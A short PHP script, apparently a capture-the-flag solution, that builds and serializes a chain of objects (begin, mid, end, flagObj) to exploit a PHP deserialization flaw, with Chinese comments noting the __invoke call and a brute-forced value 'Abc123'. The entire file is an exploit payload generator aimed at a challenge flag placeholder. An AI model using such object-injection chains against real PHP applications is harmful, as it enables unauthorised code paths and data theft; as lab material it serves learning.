<?php
class begin {
    public $var1;
}

class mid {
    public $callThis;
    function __toString() {
        return ($this->callThis)();  // 调用 end()->__invoke()
    }
}

class end {
    public $var11;
    public $var10;
}

class flagObj {
    public $hey = "FLAG_HERE";
}

$e = new end();
$e->var11 = "Abc123";   // 你爆破出来的
$e->var10 = new flagObj();

$m = new mid();
$m->callThis = $e;

$b = new begin();
$b->var1 = $m;

echo serialize($b);
